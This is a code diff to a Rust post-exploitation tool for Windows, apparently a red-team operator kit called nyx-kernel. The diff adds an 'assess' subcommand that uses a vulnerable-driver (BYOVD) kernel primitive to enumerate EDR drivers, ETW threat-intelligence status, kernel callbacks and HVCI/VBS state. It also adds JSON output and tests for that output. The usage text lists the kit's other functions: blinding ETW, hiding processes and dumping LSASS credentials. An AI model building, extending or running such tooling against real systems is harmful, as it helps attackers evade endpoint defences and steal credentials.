@@ -14,6 +14,7 @@
 //!
 //! # Usage (on the Windows target, admin cmd)
 //!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
+//!   nyx-kernel assess   # real T4-T5 kernel assessment ({"assess":{...}} JSON line)
 //!   nyx-kernel blind-etw
 //!   nyx-kernel hide <pid>
 //!   nyx-kernel dump-lsass <pid>
@@ -181,6 +182,33 @@ fn main() {
         "bootstrap" => {
             // Just bootstrap + assemble — the tier is live. Print status.
             eprintln!("[+] bootstrap complete. tier.rw is live. Use a subcommand to drive a kit.");
+        }
+
+        "assess" => {
+            // Real T4-T5 kernel assessment (BYOVD/KslD-backed, hosted-CI
+            // verified). An assessment is NOT a gate: exit 0 even for a
+            // hostile posture — only a complete failure to produce any real
+            // data is an error (and even that is reported, not faked).
+            let a = unsafe { nyx_operator_kernelsdk::assess_kernel(&*tier.rw) };
+            // Single JSON line on stdout for the CI gate / team-server parser.
+            println!("{}", assess_json_line(&a));
+            // Human summary on stderr (keeps stdout machine-parseable).
+            eprintln!(
+                "[+] kernel assessment: status={:?} total_drivers={} edr_drivers={} \
+                 etw_ti_active={} process_callbacks={} image_load_callbacks={} \
+                 registry_callbacks={} test_signing={} kd_debugger={} hvci={} vbs={}",
+                a.status,
+                a.total_drivers,
+                a.edr_drivers,
+                a.etw_ti_active,
+                a.process_callbacks,
+                a.image_load_callbacks,
+                a.registry_callbacks,
+                a.test_signing_enabled,
+                a.kernel_debugger_present,
+                a.hvci_enabled,
+                a.vbs_enabled
+            );
         }
 
         "blind-etw" => match op_blind_etw(&tier) {
@@ -1004,6 +1032,7 @@ fn usage_text() -> &'static str {
 
 Commands:
   bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
+  assess                   # real T4-T5 kernel assessment (prints {"assess":{...}} JSON line)
   blind-etw
   hide <pid>
   dump-lsass <pid>
@@ -1036,6 +1065,75 @@ Daemon mode (--serve <port>):
 }
 
 // ---- Helpers ----
+
+/// Serialize a [`nyx_operator_kernelsdk::KernelAssessment`] as the single JSON
+/// line the CI gate parses: `{"assess":{...}}`. Hand-rolled (no serde dep —
+/// the daemon protocol is JSON-lines for the same reason). The exact field
+/// names/types are the contract `.github/workflows/windows-byovd-hosted.yml`
+/// asserts on (`"status":"Assessed"`, `total_drivers > 0`).
+fn assess_json_line(a: &nyx_operator_kernelsdk::KernelAssessment) -> String {
+    format!(
+        r#"{{"assess":{{"status":"{:?}","total_drivers":{},"edr_drivers":{},"etw_ti_active":{},"process_callbacks":{},"image_load_callbacks":{},"registry_callbacks":{},"test_signing_enabled":{},"kernel_debugger_present":{},"hvci_enabled":{},"vbs_enabled":{}}}}}"#,
+        a.status,
+        a.total_drivers,
+        a.edr_drivers,
+        a.etw_ti_active,
+        a.process_callbacks,
+        a.image_load_callbacks,
+        a.registry_callbacks,
+        a.test_signing_enabled,
+        a.kernel_debugger_present,
+        a.hvci_enabled,
+        a.vbs_enabled
+    )
+}
+
+#[cfg(test)]
+mod tests {
+    use super::assess_json_line;
+    use nyx_operator_kernelsdk::{KernelAssessment, KernelAssessmentStatus};
+
+    /// The CI gate parses this exact JSON: `{"assess":{...}}` with
+    /// `"status":"Assessed"` and `total_drivers` a positive integer. The
+    /// exact-string assertion pins the format to what
+    /// `.github/workflows/windows-byovd-hosted.yml` parses.
+    #[test]
+    fn assess_json_line_matches_ci_gate_contract() {
+        let a = KernelAssessment {
+            status: KernelAssessmentStatus::Assessed,
+            total_drivers: 123,
+            edr_drivers: 2,
+            etw_ti_active: true,
+            process_callbacks: 3,
+            image_load_callbacks: 1,
+            registry_callbacks: 0,
+            test_signing_enabled: false,
+            kernel_debugger_present: false,
+            hvci_enabled: true,
+            vbs_enabled: true,
+        };
+        let line = assess_json_line(&a);
+        assert_eq!(
+            line,
+            r#"{"assess":{"status":"Assessed","total_drivers":123,"edr_drivers":2,"etw_ti_active":true,"process_callbacks":3,"image_load_callbacks":1,"registry_callbacks":0,"test_signing_enabled":false,"kernel_debugger_present":false,"hvci_enabled":true,"vbs_enabled":true}}"#
+        );
+        // The CI gate's two assertions hold on this exact line.
+        assert!(line.contains("\"status\":\"Assessed\""));
+        assert!(line.contains("\"total_drivers\":123"));
+    }
+
+    #[test]
+    fn assess_json_line_not_assessed_is_honest() {
+        let a = KernelAssessment {
+            status: KernelAssessmentStatus::NotAssessed,
+            total_drivers: 0,
+            ..KernelAssessment::default()
+        };
+        let line = assess_json_line(&a);
+        assert!(line.contains("\"status\":\"NotAssessed\""));
+        assert!(line.contains("\"total_drivers\":0"));
+    }
+}
 
 #[cfg(target_os = "windows")]
 fn to_utf16(s: &str) -> Vec<u16> {
